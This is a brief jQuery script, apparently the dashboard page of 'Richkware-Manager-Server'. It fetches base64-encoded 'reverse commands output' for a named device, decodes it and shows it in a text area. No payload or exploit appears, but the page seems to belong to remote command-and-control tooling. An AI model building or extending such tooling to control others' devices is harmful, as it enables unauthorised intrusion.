$(document).ready(function () {
    var search = window.location.search
    var deviceName = search.split("=")[1]
    console.log(search + "\n")
    console.log(deviceName)

    $("#back").click(function () {
        window.location.replace("/Richkware-Manager-Server/devices.html")
    })

    $.get("command", {data0: deviceName, channel: "webapp"}, function (response) {
        var JSONdata = JSON.parse(response)
        if (JSONdata.statusCode == 1000) {
            var output = JSONdata.message
            var decryptedOutput = atob(output)
            var commands = decryptedOutput.split("##")
            console.log(commands)

            var previous = ""
            for (var i = 0; i < commands.length; ++i) {
                previous = $("#text-area").val()
                $('#text-area').val(previous + "\n" + atob(commands[i]))
            }
        } else {
            alert("Error, retrieving reverse commands output: " + response)
        }
    })



})